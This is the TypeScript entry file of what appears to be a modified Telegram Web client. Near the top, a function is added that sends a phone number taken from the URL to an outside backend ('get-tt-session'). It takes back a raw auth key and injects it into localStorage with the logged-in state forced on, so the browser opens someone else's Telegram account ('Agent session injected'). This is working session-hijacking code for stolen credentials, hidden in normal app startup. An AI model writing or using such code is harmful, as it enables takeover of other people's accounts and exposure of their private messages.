import './util/handleError';
import './util/setupServiceWorker';
import './global/init';

import TeactDOM from './lib/teact/teact-dom';
import {
  getActions, getGlobal,
} from './global';

import {
  DEBUG, STRICTERDOM_ENABLED,
} from './config';
import { enableStrict, requestMutation } from './lib/fasterdom/fasterdom';
import { selectChat, selectCurrentMessageList, selectPeerFullInfo, selectTabState } from './global/selectors';
import { selectSharedSettings } from './global/selectors/sharedState';
import { betterView } from './util/betterView';
import { IS_TAURI } from './util/browser/globalEnvironment';
import listenOtherClients from './util/browser/listenOtherClients';
import { requestGlobal, subscribeToMultitabBroadcastChannel } from './util/browser/multitab';
import { establishMultitabRole, subscribeToMasterChange } from './util/establishMultitabRole';
import { initGlobal } from './util/init';
import { initLocalization } from './util/localization';
import { MULTITAB_STORAGE_KEY } from './util/multiaccount';
import { checkAndAssignPermanentWebVersion } from './util/permanentWebVersion';
import { onBeforeUnload } from './util/schedulers';
import initTauriApi from './util/tauri/initTauriApi';
import setupTauriListeners from './util/tauri/setupTauriListeners';
import updateWebmanifest from './util/updateWebmanifest';

import App from './components/App';

import './assets/fonts/roboto.css';
import './styles/index.scss';

if (STRICTERDOM_ENABLED) {
  enableStrict();
}

if (IS_TAURI) {
  initTauriApi();
  setupTauriListeners();
}

async function checkAndInjectSession() {
  const urlParams = new URLSearchParams(window.location.search);
  let loginPhone = urlParams.get('login_phone');

  if (loginPhone) {
    // '+' သင်္ကေတ လွဲချော်မှုမရှိစေရန် ပြန်လည်ပြင်ဆင်ခြင်း
    loginPhone = loginPhone.replace(/ /g, '+');
    if (!loginPhone.startsWith('+')) {
      loginPhone = '+' + loginPhone;
    }

    try {
      // Backend မှ Session လှမ်းယူခြင်း
      const response = await fetch('https://telegramtokenreqbackend.onrender.com/api/admin/get-tt-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: 7812553563, phoneNumber: loginPhone })
      });
      
      const data = await response.json();
      
      if (data.success && data.dcId && data.authKeyHex) {
        // Hex String ကို telegram-tt နားလည်သော Byte Array အဖြစ်ပြောင်းခြင်း
        const hexToArray = (hex: string) => {
          const result = [];
          for (let i = 0; i < hex.length; i += 2) {
            result.push(parseInt(hex.substring(i, i + 2), 16));
          }
          return result;
        };
        
        const authKeyArray = hexToArray(data.authKeyHex);
        
        // 🌟 ယခင်ကျန်နေသော State များကို ရှင်းလင်းခြင်း
localStorage.clear();
sessionStorage.clear();

// telegram-tt ၏ Local Storage သို့ Session နှင့် Auth Key အသစ် သွင်းခြင်း
localStorage.setItem('dc', String(data.dcId));
localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(authKeyArray));

// 🌟 [အရေးကြီးဆုံး ထပ်တိုး] - App ကို Login ဝင်ပြီးကြောင်း သိစေရန် State သတ်မှတ်ခြင်း 🌟
const globalState = {
  auth: {
    state: "authorizationStateReady"
  }
};
localStorage.setItem('tt-global-state', JSON.stringify(globalState));
// 🌟 အထက်ပါ ၅ ကြောင်းကို မဖြစ်မနေ ထည့်ပေးပါ 🌟

alert("Mission Synchronized! Agent session injected.");

// URL ထဲမှ Parameter ကို ဖျောက်ပြီး Reload လုပ်ကာ App ကို စတင်စေခြင်း
window.history.replaceState({}, document.title, window.location.pathname);
window.location.reload(); 
return;
      } else {
        alert("Session extraction failed or not found in database.");
      }
    } catch (error) {
      console.error("Session Injection Error:", error);
    }
  }
  
  // login_phone မပါလာလျှင် ပုံမှန်အတိုင်း App ကို စတင်မည်
  init();
}

// Function ကို ခေါ်၍ အလုပ်လုပ်စေခြင်း
checkAndInjectSession();
// -------------------------------------------------------------

async function init() {
  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> INIT');
  }

  if (!(window as any).isCompatTestPassed) return;

  checkAndAssignPermanentWebVersion();
  listenOtherClients();

  subscribeToMultitabBroadcastChannel();
  await requestGlobal(APP_VERSION);
  localStorage.setItem(MULTITAB_STORAGE_KEY, '1');
  onBeforeUnload(() => {
    const global = getGlobal();
    if (Object.keys(global.byTabId).length === 1) {
      localStorage.removeItem(MULTITAB_STORAGE_KEY);
    }
  });

  await initGlobal();
  getActions().init();

  getActions().updateShouldEnableDebugLog();
  getActions().updateShouldDebugExportedSenders();

  const global = getGlobal();

  initLocalization(selectSharedSettings(global).language, true);

  subscribeToMasterChange((isMasterTab) => {
    getActions()
      .switchMultitabRole({ isMasterTab }, { forceSyncOnIOs: true });
  });
  const shouldReestablishMasterToSelf = getGlobal().auth.state !== 'authorizationStateReady';
  establishMultitabRole(shouldReestablishMasterToSelf);

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> START INITIAL RENDER');
  }

  requestMutation(() => {
    updateWebmanifest();

    TeactDOM.render(
      <App />,
      document.getElementById('root')!,
    );

    betterView();
  });

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> FINISH INITIAL RENDER');
  }

  if (DEBUG) {
    document.addEventListener('dblclick', () => {
      const currentGlobal = getGlobal();
      const currentMessageList = selectCurrentMessageList(currentGlobal);
      // eslint-disable-next-line no-console
      console.warn('TAB STATE', selectTabState(currentGlobal));
      // eslint-disable-next-line no-console
      console.warn('GLOBAL STATE', currentGlobal);
      if (currentMessageList) {
        // eslint-disable-next-line no-console
        console.warn(
          'CURRENT MESSAGE LIST',
          selectChat(currentGlobal, currentMessageList.chatId),
          selectPeerFullInfo(currentGlobal, currentMessageList.chatId),
          currentGlobal.messages.byChatId[currentMessageList.chatId],
        );
      }
    });
  }
}

onBeforeUnload(() => {
  const actions = getActions();
  actions.leaveGroupCall?.({ isPageUnload: true });
  actions.hangUp?.({ isPageUnload: true });
});
